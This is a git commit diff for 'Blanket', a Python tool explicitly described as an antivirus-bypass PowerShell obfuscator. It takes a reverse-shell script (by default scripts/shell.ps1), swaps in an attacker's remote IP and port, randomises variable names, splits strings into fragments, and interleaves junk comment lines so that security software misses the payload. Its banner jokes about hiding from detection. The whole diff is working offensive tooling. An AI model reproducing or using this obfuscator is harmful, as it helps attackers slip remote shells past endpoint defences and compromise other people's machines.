9e099cf4ac5a7914ffc70e547c82440733bfb7c5
warren2i <83583153+Tensorshark@users.noreply.github.com>
2022-01-13 23:30:05 +0000

    Init

--- Blanket.py
+++ Blanket.py
@@ -4,31 +4,59 @@ import string
 import random
 import io
 
-parser = argparse.ArgumentParser(description='Description of your program')
+parser = argparse.ArgumentParser(description='AV Bypass PowerShell Obfuscation')
 parser.add_argument('-i','--IP', help='Enter IP for Remote Host', required=True)
 parser.add_argument('-p','--Port', help='Enter Port for Remote Host', required=True)
 parser.add_argument('-o','--Outfile', help='Output File Name', required=False)
 parser.add_argument('-s','--Script', help='Script To Encode', required=False)
+parser.add_argument('-v','--varsize', help='Maximum Variable Size', required=False, type=int)
 args = vars(parser.parse_args())
 
 ip= args['IP']
 port=args['Port']
+#ip="10.10.10.10"
+#port="4444"
+#scriptloc = "scripts/shell.ps1"
+#outfile = "shell"
+
+def logo():
+    logo = """
+
+    ▄▄▄▄    ██▓    ▄▄▄       ███▄    █  ██ ▄█▀▓█████▄▄▄█████▓
+    ▓█████▄ ▓██▒   ▒████▄     ██ ▀█   █  ██▄█▒ ▓█   ▀▓  ██▒ ▓▒
+    ▒██▒ ▄██▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒▓███▄░ ▒███  ▒ ▓██░ ▒░
+    ▒██░█▀  ▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██ █▄ ▒▓█  ▄░ ▓██▓ ░
+    ░▓█  ▀█▓░██████▒▓█   ▓██▒▒██░   ▓██░▒██▒ █▄░▒████▒ ▒██▒ ░
+    ░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░
+    ▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒ ▒░ ░ ░  ░   ░
+    ░    ░   ░ ░    ░   ▒      ░   ░ ░ ░ ░░ ░    ░    ░
+    ░          ░  ░     ░  ░         ░ ░  ░      ░  ░
+    ░
+If you are worried about being found perhaps try taking cover under a blanket.
+                  https://github.com/warren2i/Blanket
+                            For Help Use -h
+"""
+    return logo
+def printinfo():
+    print("RHOST = "+ip)
+    print("RPORT = " + port)
+    print("Script Going Under The Blanket = " + scriptloc)
+    print("Output File Name = "+outfile)
 
 if args['Script'] is not None:
-    print("Script has beeen provided")
-    scriptloc= args['Script']
+     scriptloc= args['Script']
 else:
-    print("Script hasn't been provided")
-    scriptloc= "/scripts/shell.ps1"
+     scriptloc= "/scripts/shell.ps1"
 if args['Outfile'] is not None:
-    print("OutPutFile is True")
-    outfile = args['Outfile']
+     outfile = args['Outfile']
 else:
-    print("OutPutFile is False")
-    outfile = "shell.ps1"
+     outfile = "shell.ps1"
 
+if args['varsize'] is not None:
+     varsize = args['varsize']
+else:
+     varsize=10
 
-print(args)
 
 findvar = re.compile(
     r'(?<=\$)(.*?)(?=[\s,),\.,=,\",\;])')  ## lockback search for $ look forward search for end char or space
@@ -57,7 +85,7 @@ lines = f.readlines()
 f.close()
 f = open(scriptloc, "rt")
 
-w = open("encoded/"+outfile+".ps1", "wt")
+w = open("encoded/"+outfile, "wt")
 
 f.close()
 
@@ -70,7 +98,8 @@ def randomvar ( length ):  ##create a random variable of len length
 
 def addcomments ():  ## inserts a comment on each line
     transcript = open("transcripts/rickandmorty.txt", "rt")
-    for num, aline in enumerate(transcript, 2):
+    for num, aline in enumerate(transcript, 1):
+        #print(num)
         if random.randrange(num):
             continue
         line = aline
@@ -94,11 +123,10 @@ script = ""
 for line in lines:
     lines = findvar.finditer(line)  ##match variables
     for var in lines:  ## loop over variables
-        print(var)
         var = var.group(0)  ## pass index of the group, strips what we dont want.
         if var not in vararray:  ## don't populate array with same value twice
             vararray.append('$' + var)  ## add found var to vararray
-            randomvararray.append('$' + randomvar(10))  ## add random var to randomvar array at matching index
+            randomvararray.append('$' + randomvar(varsize))  ## add random var to randomvar array at matching index
 
     for x in enumerate(vararray):  ## replace variables with random variables
         script = script.replace(vararray[x[0]], randomvararray[x[0]])
@@ -106,14 +134,13 @@ for line in lines:
         script = script.replace("1337", port)
     for l in list:
         if l in line:
-            b = breakdatatype(l, random.randrange(3, 14))  ## pass string and random length to breakdata function
+            b = breakdatatype(l, random.randrange(3, varsize))  ## pass string and random length to breakdata function
             # print(line)
             line = line.replace(l, b[1])
             # print(line)
             # print((b[1])+l) ##just to debug
             for a in enumerate(b[0]):
-                varr.append((b[0][a[0]][0]) + ' = "' + b[0][a[0]][
-                    1] + '"')  ##formats into powershell variable format ie $MUI = "Syst"
+                varr.append((b[0][a[0]][0]) + ' = "' + b[0][a[0]][1] + '"')  ##formats into powershell variable format ie $MUI = "Syst"
     script = script + line
 variables = ("\n".join(varr))
 script = variables + "\n" + script
@@ -122,3 +149,5 @@ s = io.StringIO(script)  ## used to itterate string 'line by line...'
 for line in s:
     w.write(line)  ## write line to file
     w.write(addcomments() + '\n')  ## write comment line to file
+print(logo())
+printinfo()
